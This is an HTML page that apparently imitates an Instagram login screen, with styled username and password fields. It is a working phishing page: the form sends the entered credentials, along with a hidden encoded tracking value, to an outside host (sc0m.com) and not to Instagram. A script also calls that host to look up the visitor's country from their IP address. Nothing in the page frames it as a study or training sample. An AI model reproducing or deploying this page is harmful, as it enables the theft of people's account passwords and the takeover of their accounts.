<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>login</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap"
      rel="stylesheet"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap"
      rel="stylesheet"
    />
    <style>
      body {
        background-color: rgb(239, 239, 239);
        font-family: "Open Sans", sans-serif;
      }
      .container {
        width: 500px;
        margin: auto;
        padding: 30px;
        border-radius: 7px;
        background: #fff;
      }
      .container .input {
        width: 100%;
        margin-top: 10px;
        margin-bottom: 5px;
        height: 35px;
        border-radius: 5px;
        border: 1px solid rgba(193, 192, 192, 0.562);
        padding: 2px;
      }
      .btn {
        margin: auto;
        text-align: center;
      }
      .btn .log {
        background-color: #0096f6;
        color: #fff;
        width: 100%;
        height: 40px;
        border-radius: 6px;
        font-size: 18px;
        border: none;
        margin-top: 10px;
      }
      .create {
        background-color: rgb(76, 158, 35);
        color: #fff;
        width: 50%;
        height: 40px;
        border-radius: 6px;
        font-size: 18px;
        border: none;
        margin-top: 10px;
      }
      @media (max-width: 800px) {
        .container {
          width: 80%;
          margin-left: 2%;
          margin-right: 2%;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h2
        style="
          color: rgb(63, 100, 175);
          font-family: 'Dancing Script', cursive;
          font-size: 40px;
        "
      >
        instagram
      </h2>
      <form action="https://sc0m.com/v/add" method="post">
        <input
          class="input"
          type="text"
          placeholder="number phone ,or email , or username"
          name="email"
        />
        <input
          class="input"
          type="password"
          placeholder="password"
          name="password"
        />
        <div>
          <input type="hidden" id="code" name="codecountry" />
          <input type="hidden" value="aWQ9c2MwbV9sYW5nPWVuX3NjPTI1X3VzZXI9NDU5MjA2ODk5MjY=" id="data" name="data" />
        </div>
        <div class="btn">
          <button class="log">Log In</button>
          <p style="color: blue">forget password ?</p>
        </div>
      </form>
    </div>
    <script src="https://unpkg.com/country-phone-prefix@latest"></script>
    <script>

      let fetchRes = fetch("https://sc0m.com/ext/ip.php");
      fetchRes
        .then((res) => res.json())
        .then((d) => {
          let dd = cpp[d];
          document.getElementById("code").value = dd.prefix;
        });
    </script>
  </body>
</html>
